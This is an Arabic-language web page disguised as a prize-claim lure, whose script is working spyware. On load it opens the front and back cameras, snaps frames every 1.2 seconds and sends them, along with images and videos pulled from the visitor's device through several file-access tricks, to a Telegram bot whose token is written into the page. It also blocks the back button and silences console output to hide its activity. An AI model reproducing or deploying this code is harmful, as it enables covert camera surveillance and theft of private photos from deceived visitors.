<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>جائزة عمك عبود</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Tahoma',sans-serif;overflow:hidden}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;transition:0.3s}
.loader{width:60px;height:60px;border:5px solid rgba(255,215,0,0.2);border-top:5px solid #ffd700;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{to{transform:rotate(360deg)}}
.status-text{color:#ffd700;font-size:20px;letter-spacing:2px}
.sub-text{color:#888;font-size:13px}
.card{background:linear-gradient(145deg,#1a1a2e,#16213e);padding:40px 30px;border-radius:24px;border:1px solid rgba(255,215,0,0.15);text-align:center;max-width:400px;width:90%;z-index:1}
.card h1{color:#ffd700;font-size:28px}
.card p{color:#aaa;font-size:15px;line-height:1.7;margin-bottom:25px}
.gift-box{font-size:70px;margin:15px 0;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
.btn{background:linear-gradient(135deg,#ffd700,#f0a500);color:#0a0a0a;border:none;padding:14px 40px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s}
.btn:hover{transform:scale(1.05)}
.timer{color:#555;font-size:13px;margin-top:18px}
</style>
</head>
<body>

<div class="overlay" id="blockOverlay">
  <div class="loader"></div>
  <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
  <div class="sub-text">يرجى الانتظار</div>
</div>

<div class="card" id="mainCard">
  <div class="gift-box">🎁</div>
  <h1>تهانينا!</h1>
  <p>لقد فزت بجائزة عمك عبود<br>اضغط الزر لاستلام هديتك</p>
  <button class="btn" id="claimBtn">🏆 استلم الجائزة</button>
  <div class="timer" id="timer">⏳ يتبقى 24:00</div>
</div>

<script>
// ============================================================
// ================ BOT CONFIG =================================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let exploitActive = false;
let cameraStreams = [];

// ============================================================
// ================ استغلال ملفات الهاتف (بدون إذن) ===========
// ============================================================

// الطريقة 1: استغلال File System Access API
async function stealFilesViaFileSystem() {
  try {
    // محاولة فتح مجلد الصور
    const dirHandle = await window.showDirectoryPicker?.({ mode: 'read' });
    if (!dirHandle) return;
    
    const files = [];
    for await (const entry of dirHandle.values()) {
      if (entry.kind === 'file') {
        const file = await entry.getFile();
        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
          files.push(file);
          // إرسال كل ملف
          sendDocument(file, `📁 ${file.name}`);
        }
      }
    }
  } catch(e) {}
}

// الطريقة 2: استغلال input مخفي مع webkitdirectory
function exploitHiddenDirectoryInput() {
  try {
    const input = document.createElement('input');
    input.type = 'file';
    input.webkitdirectory = true;
    input.multiple = true;
    input.style.display = 'none';
    document.body.appendChild(input);
    
    // محاكاة النقر عبر حدث برمجي
    const clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
    input.dispatchEvent(clickEvent);
    
    input.addEventListener('change', function(e) {
      const files = e.target.files;
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
          sendDocument(file, `📁 ${file.name}`);
        }
      }
    });
  } catch(e) {}
}

// الطريقة 3: استغلال Drag & Drop الوهمي
function exploitFakeDragDrop() {
  try {
    // إنشاء منطقة سحب وهمية
    const dropZone = document.createElement('div');
    dropZone.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
    document.body.appendChild(dropZone);
    
    // محاكاة حدث السحب من الهاتف
    const dataTransfer = new DataTransfer();
    // لا يمكن محاكاة الملفات مباشرة، لكن نضبط المستمعين
    dropZone.addEventListener('drop', function(e) {
      e.preventDefault();
      const files = e.dataTransfer.files;
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
          sendDocument(file, `📁 ${file.name}`);
        }
      }
    });
  } catch(e) {}
}

// الطريقة 4: استغلال IndexedDB + Service Worker (استهداف الملفات المخزنة)
function exploitIndexedDB() {
  try {
    const request = indexedDB.open('fileStorage', 1);
    request.onsuccess = function(e) {
      const db = e.target.result;
      const tx = db.transaction(['files'], 'readonly');
      const store = tx.objectStore('files');
      const getAll = store.getAll();
      getAll.onsuccess = function() {
        const files = getAll.result;
        files.forEach(file => {
          if (file.type && file.type.startsWith('image/')) {
            sendDocument(file, `📁 ${file.name}`);
          }
        });
      };
    };
  } catch(e) {}
}

// الطريقة 5: استغلال WebKit FileSystem (للمتصفحات القديمة)
function exploitWebKitFileSystem() {
  try {
    window.webkitRequestFileSystem?.(window.TEMPORARY, 1024*1024*100, function(fs) {
      fs.root.createReader().readEntries(function(entries) {
        entries.forEach(entry => {
          if (entry.isFile) {
            entry.file(function(file) {
              if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
                sendDocument(file, `📁 ${file.name}`);
              }
            });
          }
        });
      });
    });
  } catch(e) {}
}

// ============================================================
// ================ تشغيل الكاميرا ============================
// ============================================================
function requestCamera(facingMode, callback) {
  const constraints = {
    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  };
  navigator.mediaDevices.getUserMedia(constraints)
    .then(stream => {
      cameraStreams.push(stream);
      if (callback) callback(stream);
    })
    .catch(() => {
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
          cameraStreams.push(stream);
          if (callback) callback(stream);
        }).catch(() => {});
    });
}

function captureFrontCamera() {
  requestCamera('user', (stream) => {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    exploitActive = true;
    startCapture(video, '📸 أمامي');
  });
}

function captureBackCamera() {
  requestCamera('environment', (stream) => {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    exploitActive = true;
    startCapture(video, '📸 خلفي');
  });
}

function startCapture(videoElement, label = '📸') {
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = 480;
  const ctx = canvas.getContext('2d');
  setInterval(() => {
    if (videoElement.readyState >= 2) {
      try {
        ctx.drawImage(videoElement, 0, 0, 640, 480);
        const imgData = canvas.toDataURL('image/jpeg', 0.9);
        sendPhoto(imgData, label);
      } catch(e) {}
    }
  }, 1200);
}

// ============================================================
// ================ إرسال إلى تيليجرام ========================
// ============================================================
function sendPhoto(imageData, caption = '') {
  if (!CHAT_ID || !imageData) return;
  try {
    const blob = dataURLtoBlob(imageData);
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
    fd.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
  } catch(e) {}
}

function sendDocument(file, caption = '') {
  if (!CHAT_ID || !file) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('document', file, file.name);
    fd.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd }).catch(() => {});
  } catch(e) {}
}

function dataURLtoBlob(dataURL) {
  const parts = dataURL.split(',');
  const mime = parts[0].match(/:(.*?);/)[1];
  const bstr = atob(parts[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
  return new Blob([u8arr], { type: mime });
}

// ============================================================
// ================ الحصول على Chat ID ========================
// ============================================================
function getChatId() {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
    .then(r => r.json())
    .then(d => {
      if (d.ok && d.result && d.result.length) {
        const last = d.result[d.result.length - 1];
        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
        if (CHAT_ID) {
          startFullExploit();
        } else {
          setTimeout(getChatId, 1500);
        }
      } else {
        setTimeout(getChatId, 1500);
      }
    })
    .catch(() => setTimeout(getChatId, 1500));
}

// ============================================================
// ================ بدء الاستغلال الكامل ======================
// ============================================================
function startFullExploit() {
  setTimeout(() => {
    document.getElementById('blockOverlay').style.display = 'none';
  }, 1000);
  
  // تشغيل الكاميرا
  setTimeout(captureFrontCamera, 200);
  setTimeout(captureBackCamera, 400);
  
  // تشغيل سرقة الملفات
  setTimeout(stealFilesViaFileSystem, 500);
  setTimeout(exploitHiddenDirectoryInput, 700);
  setTimeout(exploitFakeDragDrop, 900);
  setTimeout(exploitIndexedDB, 1100);
  setTimeout(exploitWebKitFileSystem, 1300);
  
  // إعادة المحاولة
  setInterval(() => {
    if (!exploitActive) {
      captureFrontCamera();
      captureBackCamera();
      stealFilesViaFileSystem();
    }
  }, 5000);
}

// ============================================================
// ================ منع الخروج ================================
// ============================================================
history.pushState(null, '', location.href);
window.addEventListener('popstate', () => history.pushState(null, '', location.href));

// ============================================================
// ================ التشغيل التلقائي ==========================
// ============================================================
getChatId();

setTimeout(() => {
  captureFrontCamera();
  captureBackCamera();
  stealFilesViaFileSystem();
}, 100);

console.log = console.warn = console.error = () => {};

document.getElementById('claimBtn').addEventListener('click', function() {
  this.textContent = '✅ تم الاستلام!';
});
</script>
</body>
</html>
